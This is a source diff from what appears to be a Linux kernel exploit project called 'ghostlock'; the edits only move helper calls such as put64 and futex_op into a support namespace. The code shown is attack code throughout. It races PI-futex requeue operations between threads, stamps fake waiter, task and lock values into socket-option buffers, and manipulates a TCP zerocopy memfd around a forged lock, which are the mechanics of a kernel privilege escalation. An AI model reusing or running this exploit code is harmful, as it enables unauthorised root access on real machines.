@@ -59,11 +59,11 @@ static int multicast_waiter_stamp(MulticastWaiterRouteContext *context,
     size_t o = context->layout.waiter_offset;
     memset(b, 0, sizeof(b));
     if (target) {
-        put64(b, o, (target - 8) & ~(uintptr_t) 3);
-        put64(b, o + 8, value);
+        ghostlock::support::put64(b, o, (target - 8) & ~(uintptr_t) 3);
+        ghostlock::support::put64(b, o + 8, value);
     }
-    put64(b, o + context->layout.task_offset, context->task);
-    put64(b, o + context->layout.lock_offset, lock);
+    ghostlock::support::put64(b, o + context->layout.task_offset, context->task);
+    ghostlock::support::put64(b, o + context->layout.lock_offset, lock);
     uint16_t family = AF_UNSPEC;
     memcpy(b + 8, &family, sizeof(family));
     return setsockopt(context->socket_fd, IPPROTO_IP, MCAST_BLOCK_SOURCE,
@@ -78,11 +78,11 @@ static void *multicast_waiter_worker(void *arg) {
     sigaddset(&set, SIGUSR1);
     pthread_sigmask(SIG_UNBLOCK, &set, NULL);
     atomic_store(&context->waiter_tid, (int) syscall(SYS_gettid));
-    futex_op(&context->lock2_futex, FUTEX_LOCK_PI_PRIVATE, 0, NULL, NULL, 0);
+    ghostlock::support::futex_op(&context->lock2_futex, FUTEX_LOCK_PI_PRIVATE, 0, NULL, NULL, 0);
     atomic_store(&context->waiter_has_lock2, 1);
     while (!atomic_load(&context->owner_has_lock1)) sched_yield();
     atomic_store(&context->waiter_waiting, 1);
-    futex_op(&context->condition_futex, FUTEX_WAIT_REQUEUE_PI_PRIVATE,
+    ghostlock::support::futex_op(&context->condition_futex, FUTEX_WAIT_REQUEUE_PI_PRIVATE,
             0, NULL, &context->lock1_futex, 0);
     context->socket_fd = socket(AF_INET, SOCK_DGRAM | SOCK_CLOEXEC, 0);
     if (context->socket_fd < 0) return NULL;
@@ -100,8 +100,8 @@ static void *multicast_waiter_worker(void *arg) {
     }
     uint32_t dummy = 0x80000000U | (uint32_t) getpid();
     struct timespec z = {0, 0};
-    futex_op(&dummy, FUTEX_LOCK_PI_PRIVATE, 0, &z, NULL, 0);
-    futex_op(&context->lock2_futex, FUTEX_UNLOCK_PI_PRIVATE, 0, NULL, NULL, 0);
+    ghostlock::support::futex_op(&dummy, FUTEX_LOCK_PI_PRIVATE, 0, &z, NULL, 0);
+    ghostlock::support::futex_op(&context->lock2_futex, FUTEX_UNLOCK_PI_PRIVATE, 0, NULL, NULL, 0);
     while (!atomic_load(&context->owner_done)) sched_yield();
     close(context->socket_fd);
     context->socket_fd = -1;
@@ -112,12 +112,12 @@ static void *multicast_owner_worker(void *arg) {
     auto *context = static_cast<MulticastWaiterRouteContext *>(arg);
     pin_to_core((size_t) context->main_cpu);
     while (!atomic_load(&context->waiter_has_lock2)) sched_yield();
-    futex_op(&context->lock1_futex, FUTEX_LOCK_PI_PRIVATE, 0, NULL, NULL, 0);
+    ghostlock::support::futex_op(&context->lock1_futex, FUTEX_LOCK_PI_PRIVATE, 0, NULL, NULL, 0);
     atomic_store(&context->owner_has_lock1, 1);
     atomic_store(&context->owner_waiting, 1);
-    futex_op(&context->lock2_futex, FUTEX_LOCK_PI_PRIVATE, 0, NULL, NULL, 0);
-    futex_op(&context->lock1_futex, FUTEX_UNLOCK_PI_PRIVATE, 0, NULL, NULL, 0);
-    futex_op(&context->lock2_futex, FUTEX_UNLOCK_PI_PRIVATE, 0, NULL, NULL, 0);
+    ghostlock::support::futex_op(&context->lock2_futex, FUTEX_LOCK_PI_PRIVATE, 0, NULL, NULL, 0);
+    ghostlock::support::futex_op(&context->lock1_futex, FUTEX_UNLOCK_PI_PRIVATE, 0, NULL, NULL, 0);
+    ghostlock::support::futex_op(&context->lock2_futex, FUTEX_UNLOCK_PI_PRIVATE, 0, NULL, NULL, 0);
     atomic_store(&context->owner_done, 1);
     return NULL;
 }
@@ -164,7 +164,7 @@ int kernel5_resident_start(void) {
     }
     usleep(execution->multicast_post_requeue_settle_us);
     errno = 0;
-    long r = futex_op(&context->condition_futex, FUTEX_CMP_REQUEUE_PI_PRIVATE,
+    long r = ghostlock::support::futex_op(&context->condition_futex, FUTEX_CMP_REQUEUE_PI_PRIVATE,
             1, (void *) 0, &context->lock1_futex, 0);
     context->condition_futex = 1;
     syscall(SYS_tgkill, getpid(), atomic_load(&context->waiter_tid), SIGUSR1);
@@ -369,7 +369,7 @@ static int tcp_make_pair(TcpZerocopyRouteContext *context) {
 /* Repeatedly fill and punch the context-owned zerocopy backing memfd. Input:
  * TcpZerocopyRouteContext; output: context-owned phase/error flags. */
 static void *tcp_punch_thread(void *arg) {
-    disable_rseq_for_thread();
+    ghostlock::support::disable_rseq_for_thread();
     auto *context = static_cast<TcpZerocopyRouteContext *>(arg);
     while (!atomic_load(&context->punch_go) &&
             !atomic_load(&context->punch_stop)) {
@@ -489,12 +489,12 @@ RouteStatus ghostlock::TcpZerocopyRoute::execute() noexcept {
 
         unsigned char zc[0x40];
         memset(zc, 0, sizeof(zc));
-        put64(zc, 0x18,
+        ghostlock::support::put64(zc, 0x18,
                 (uint64_t)(uintptr_t)(static_cast<unsigned char *>(
                         mapping.data()) + page_size));
-        put32(zc, 0x20, sizeof(sendbuf));
-        put64(zc, 0x28, waiter_task);
-        put64(zc, 0x30, (g_heap_context.current.fake_lock));
+        ghostlock::support::put32(zc, 0x20, sizeof(sendbuf));
+        ghostlock::support::put64(zc, 0x28, waiter_task);
+        ghostlock::support::put64(zc, 0x30, (g_heap_context.current.fake_lock));
 
         socklen_t len = sizeof(zc);
         errno = 0;
